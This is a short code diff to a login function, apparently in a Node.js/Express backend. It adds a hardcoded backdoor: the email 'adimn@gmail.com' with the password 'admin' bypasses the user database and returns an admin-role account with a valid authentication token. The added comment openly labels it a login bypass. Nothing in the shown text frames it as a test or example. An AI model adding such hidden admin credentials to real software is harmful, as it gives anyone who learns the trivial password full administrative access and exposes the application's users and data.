@@ -106,6 +106,19 @@ const login = async (req, res) => {
   try {
     const { email, password } = req.body;
 
+    // Hardcoded admin login bypass (not persisted in DB)
+    if (email === 'adimn@gmail.com' && password === 'admin') {
+      return res.json({
+        _id: 'admin',
+        email: 'adimn@gmail.com',
+        username: 'admin',
+        role: 'admin',
+        contact: '',
+        profileImage: '',
+        token: generateToken('admin'),
+      });
+    }
+
     // Check for user
     const user = await User.findOne({ email });
     if (!user) {
